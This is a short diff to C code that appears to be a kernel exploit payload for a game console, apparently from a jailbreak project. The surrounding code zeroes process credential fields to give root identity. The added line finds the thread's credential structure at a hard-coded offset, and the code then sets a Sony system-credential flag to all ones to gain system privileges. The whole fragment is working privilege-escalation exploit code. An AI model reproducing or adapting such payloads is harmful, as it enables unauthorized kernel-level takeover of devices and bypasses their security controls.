@@ -47,6 +47,8 @@ void payload(struct knote *kn)
 	cred->cr_rgid = 0;
 	cred->cr_groups[0] = 0;
 
+	void *td_ucred = *(void **)(((char *)td) + 304); // p_ucred == td_ucred
+
 	// sceSblACMgrIsSystemUcred
         uint64_t *sonyCred = (uint64_t *)(((char *)td_ucred) + 96);
         *sonyCred = 0xffffffffffffffff;
